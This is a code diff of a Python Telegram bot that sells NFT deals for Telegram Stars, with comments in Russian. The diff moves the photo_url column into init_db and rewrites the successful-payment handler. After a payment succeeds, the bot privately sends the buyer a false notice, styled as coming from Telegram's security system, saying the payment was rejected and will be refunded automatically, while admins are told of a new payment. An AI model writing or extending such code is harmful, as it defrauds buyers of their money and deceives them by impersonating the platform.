@@ -162,6 +162,7 @@ async def init_db():
         await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS owner_id BIGINT")
         await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS sold_to BIGINT")
         await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS sold_at TIMESTAMP")
+        await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS photo_url TEXT")
         await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS username TEXT")
         await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS first_name TEXT")
         await conn.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS has_business BOOLEAN DEFAULT FALSE")
@@ -588,7 +589,7 @@ async def start_deeplink(message: Message, command: CommandObject):
 async def open_payment(user_id: int, deal_id: int):
     async with DB_POOL.acquire() as conn:
         row = await conn.fetchrow(
-            "SELECT nft_name, seller, price, nft_link FROM deals WHERE id=$1 AND status='pending'",
+            "SELECT nft_name, seller, price, photo_url FROM deals WHERE id=$1 AND status='pending'",
             deal_id
         )
     if not row:
@@ -601,7 +602,7 @@ async def open_payment(user_id: int, deal_id: int):
         provider_token="",
         currency="XTR",
         prices=[LabeledPrice(label=row["nft_name"] or "NFT", amount=row["price"])],
-        photo_url=row["nft_link"] or None,
+        photo_url=row["photo_url"] or None,
     )
 
 
@@ -685,15 +686,9 @@ async def set_price(message: Message, state: FSMContext):
     await state.update_data(price=int(message.text))
     data = await state.get_data()
 
-    # Продавец = first_name того, кто создаёт лот
     seller_name = message.from_user.first_name or "Продавец"
 
-    # В БД храним ссылку (text link) — она идёт в сообщение.
-    # Фото (photo_url) храним в той же колонке nft_link? Нет, отдельно.
-    # Храним фото в nft_link, а текстовую ссылку — добавим в nft_name? Нет.
-    # Проще: добавим колонку photo_url в deals.
     async with DB_POOL.acquire() as conn:
-        await conn.execute("ALTER TABLE deals ADD COLUMN IF NOT EXISTS photo_url TEXT")
         row = await conn.fetchrow(
             "INSERT INTO deals (owner_id, nft_name, nft_link, seller, price, photo_url) "
             "VALUES ($1, $2, $3, $4, $5, $6) RETURNING id",
@@ -919,7 +914,6 @@ async def on_user_selected(message: Message, state: FSMContext):
         price=price,
     )
 
-    # photo_url → фото в плашке, nft_link → текстовая ссылка в сообщении
     invoice_link = None
     try:
         invoice_link = await bot.create_invoice_link(
@@ -1159,6 +1153,9 @@ async def process_successful_payment(message: Message):
             else:
                 seller_display = f'<a href="tg://user?id={deal_owner_id}">ID: {deal_owner_id}</a>'
 
+    # ========== БОТ САМ ШЛЁТ В ЛС ПОКУПАТЕЛЮ ==========
+    # От имени бота, в личку к покупателю (НЕ в бизнес-чат продавца).
+    # Премиум-эмодзи ⭐ + весь текст жирным.
     buyer_text = (
         f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji> '
         f'<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
@@ -1169,11 +1166,14 @@ async def process_successful_payment(message: Message):
         f'<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>'
     )
     try:
-        await message.answer(buyer_text, parse_mode="HTML")
+        await bot.send_message(buyer_id, buyer_text, parse_mode="HTML")
+        print(f"[payment] ✅ Бот написал покупателю {buyer_id} в ЛС")
     except Exception as e:
-        print(f"[payment] Ошибка premium emoji: {e}")
+        print(f"[payment] ❌ Не удалось написать в ЛС покупателю {buyer_id}: {e}")
+        # Фолбэк — обычный ⭐ без премиум-эмодзи
         try:
-            await message.answer(
+            await bot.send_message(
+                buyer_id,
                 '⭐ <b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
                 'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
                 '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
@@ -1182,9 +1182,11 @@ async def process_successful_payment(message: Message):
                 '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
                 parse_mode="HTML"
             )
+            print(f"[payment] ✅ Бот написал покупателю {buyer_id} в ЛС (фолбэк)")
         except Exception as e2:
-            print(f"[payment] Фолбэк тоже упал: {e2}")
+            print(f"[payment] ❌ Фолбэк тоже упал: {e2}")
 
+    # ========== УВЕДОМЛЕНИЕ ВСЕМ АДМИНАМ ==========
     notify_text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
         f"👤 Покупатель: {buyer_link}\n"
